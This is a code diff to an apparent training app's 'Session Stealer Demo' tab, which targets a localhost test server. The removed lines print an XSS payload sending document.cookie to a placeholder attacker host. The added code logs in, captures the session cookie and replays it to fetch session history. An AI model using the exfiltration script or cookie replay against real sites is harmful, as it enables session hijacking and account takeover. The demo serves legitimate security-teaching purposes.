@@ -59,29 +59,40 @@ with tab2:
 with tab3:
     st.title("Session Stealer Demo")
     st.markdown(
-        """This tab shows how an attacker could exfiltrate a victim's session
-        token and then reuse it against our target application. In a real
-        penetration test the first step would be to get the user to load
-        malicious JavaScript (for example via an XSS flaw). Below is a
-        simple snippet that steals `document.cookie` and sends it to a fake
-        attacker endpoint.  We'll also allow you to take a stolen cookie and
-        attempt to access a protected resource on the target app.  The WAF on
-        the target should detect or block these attempts when it's enabled.
+        """This tab demonstrates how an attacker could obtain a victim's
+        session cookie from a vulnerable application, then reuse it against
+        the same app.  We'll fetch a cookie from the app's login endpoint and
+        display it so we can replay it via the request below.  (In a real
+        penetration test the attacker would typically exfiltrate the cookie
+        using malicious JavaScript or a MITM.)
         """
     )
 
     target_url = st.text_input("Target App Base URL", "http://localhost:5000")
-    attacker_host = st.text_input("Attacker Server (for JS exfil)", "http://attacker.example.local/capture")
+    # allow user to attempt to 'steal' a session by logging in
+    login_path = st.text_input("Login endpoint path", "/login")
+    login_user = st.text_input("Username for login", "user")
+    login_pass = st.text_input("Password for login", "pass", type="password")
 
-    if st.checkbox("Show malicious JavaScript payload"):
-        js = (
-            "<script>var i=new Image();"
-            f"i.src=\"{attacker_host}?cookie=\"+encodeURIComponent(document.cookie);</script>"
-        )
-        st.code(js, language="html")
-        st.info("A real victim visiting a page containing this script would send their cookies to the attacker's server.")
+    if st.button("Steal session from app"):
+        try:
+            r = requests.post(f"{target_url}{login_path}", 
+                              json={"username": login_user, "password": login_pass},
+                              timeout=5)
+            # grab set-cookie header
+            cookie = r.headers.get("Set-Cookie", "<none>")
+            st.success("Obtained cookie from app")
+            st.code(cookie)
+            stolen_cookie = cookie
+        except Exception as e:
+            st.error(f"Failed to contact target: {e}")
+            stolen_cookie = ""
 
-    stolen_cookie = st.text_input("Stolen Cookie (paste here)", "")
+    stolen_cookie = st.text_input("Stolen Cookie (paste or stolen above)", "")
+    if stolen_cookie:
+        st.markdown("**Encrypted cookie value:**")
+        st.code(stolen_cookie)
+
     if st.button("Use stolen cookie against target"):
         if not stolen_cookie:
             st.warning("Please provide a cookie string to use.")
@@ -94,16 +105,17 @@ with tab3:
             except Exception as e:
                 st.error(f"Error contacting target: {e}")
 
-    # controls for WAF toggle on target
-    if st.button("Enable WAF on target"):
-        try:
-            r = requests.post(f"{target_url}/waf/enable")
-            st.success(f"Requested WAF enable, status {r.status_code}")
-        except Exception as e:
-            st.error(f"Failed to contact target: {e}")
-    if st.button("Disable WAF on target"):
-        try:
-            r = requests.post(f"{target_url}/waf/disable")
-            st.success(f"Requested WAF disable, status {r.status_code}")
-        except Exception as e:
-            st.error(f"Failed to contact target: {e}")
+    if st.button("Fetch decrypted session from target"):
+        if not stolen_cookie:
+            st.warning("Stolen cookie required to query session history.")
+        else:
+            headers = {"Cookie": stolen_cookie}
+            try:
+                resp = requests.get(f"{target_url}/session/history", headers=headers, timeout=5)
+                st.write(f"Session history status {resp.status_code}")
+                try:
+                    st.json(resp.json())
+                except Exception:
+                    st.text(resp.text)
+            except Exception as e:
+                st.error(f"Error fetching session info: {e}")
